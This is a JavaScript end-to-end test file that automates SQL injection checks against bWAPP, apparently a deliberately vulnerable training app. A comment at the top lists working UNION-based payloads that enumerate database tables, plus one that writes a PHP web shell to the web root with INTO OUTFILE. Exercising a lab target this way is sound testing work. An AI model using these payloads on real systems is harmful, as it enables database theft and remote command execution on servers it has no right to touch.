import Home from '../../page-objects/home.page';

describe('SQL Injection', function () {
	
	/*
	*

	'order by 8-- -
	AAA 'union select 1,2,3,4,5,6,7-- -

	AAA 'union select 1,table_name,3,4,5,6,7 from  information_schema.tables-- -
	
	select table_name from  information_schema.tables

	SELECT CONCAT("SQL ", "Tutorial ", "is ", "fun!") AS ConcatenatedString; 
	table_name from  information_schema.tables

	Select SUBSTRING( 
	( select table_name from  information_schema.tables FOR XML PATH('')), 
	2 , 9999) As tables

	AAA 'union select 1, SUBSTRING( 
	( select table_name from  information_schema.tables FOR XML PATH('')), 
	2 , 9999),3,4,5,6,7-- -

	 a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/html/bWAPP/images/yabadooo.php" -- -
k
	*/
	it.only('(GET/Search) - sqli_1.php', function () {
		Home.login('/sqli_1.php');
		Home.changeSecurityLevel('low');

		const setValue = (value) => {
			$('#title').assert().setValue(value);
			$('button[value=search]').assert().click();
		};
		assert.ok(
			() => {
				setValue(`'`);
				return !! $('#table_yellow tbody').assert().getText()
					.includes('error in your SQL syntax;');
			},
			"SQL injection is not possible, could not find string 'error in your SQL syntax;'"
		);

		setValue("The");

		expect($('#table_yellow tbody').getText().match(/The/g).length)
			.to.equal(5,"There is not 5 movie matches for 'The'");

		const checkColumnCount = (count) => {
			setValue(`'order by ${count}-- -`);
			return !! $('#table_yellow tbody').assert().getText()
				.includes('Error: Unknown column');
		};

		const fillArray = (n) => {
			let array = Array.apply(null, Array(n)).map(function (x, i) { return i });
			array.shift();
			return array;
		};
		
		let count = 1;
		while(true){
			if(checkColumnCount(count)){
				break;
			} else{
				count++;
			}
		}
		
		expect(
			count === 8 && 
			!! $('#table_yellow tbody').getText().match(/Unknown/g) 
		).to.equal(true);
		
		expect(checkColumnCount(8)).to.equal(true,
			`Table HTML does not contain the string 'SQL syntax' actual text '${ $('#table_yellow tbody').getText() }'`
		);
	});

	/* 
		 (requires the PHP SQLite module) needs to be installed on server
	*/
	it.skip('sqli_11.php', function () {
		Home.login('/sqli_11.php');
		Home.changeSecurityLevel('low');
		$('#title').setValue('a')
		$('button[value=search]').click();
	});

	it('(GET/Select) - sqli_2.php', function () {
		Home.login('/sqli_2.php');
		Home.changeSecurityLevel('low');
		expect($('select[name=movie]').isExisting()).to.equal(true);
		const items = $('select[name=movie]').getText().trim().split('\n').map(o=>o.trim());
		$('button[value=go]').click()
		
		const injected = "test";
		Home.loadPage(`/sqli_2.php?movie='${injected}`)
		expect($('#table_yellow tbody').isExisting()).to.equal(true);
		
		$('#table_yellow tbody').getText()
	});
	
});